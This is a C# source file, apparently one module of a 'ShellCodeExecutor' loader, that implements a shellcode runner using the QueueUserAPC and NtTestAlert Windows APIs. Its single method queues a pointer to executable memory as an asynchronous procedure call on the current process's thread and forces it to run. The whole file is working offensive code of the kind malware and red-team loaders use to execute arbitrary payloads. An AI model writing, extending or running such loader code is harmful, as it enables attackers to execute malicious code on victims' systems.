using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellCodeExecutor
{
   
    internal class QueueUserAPCShellCodeRunner : IShellCodeRunner
    {
        
        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr NtTestAlert();

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        public void RunShellCode(IntPtr rwxMemory)
        {
            IntPtr pt = OpenThread(ThreadAccess.SET_CONTEXT, false, Process.GetCurrentProcess().Threads[0].Id);
            IntPtr ptr = QueueUserAPC(rwxMemory, pt, IntPtr.Zero);
            NtTestAlert();
        }

        override
        public String ToString()
        {
            return "QueueUserAPC";
        }
    }
}
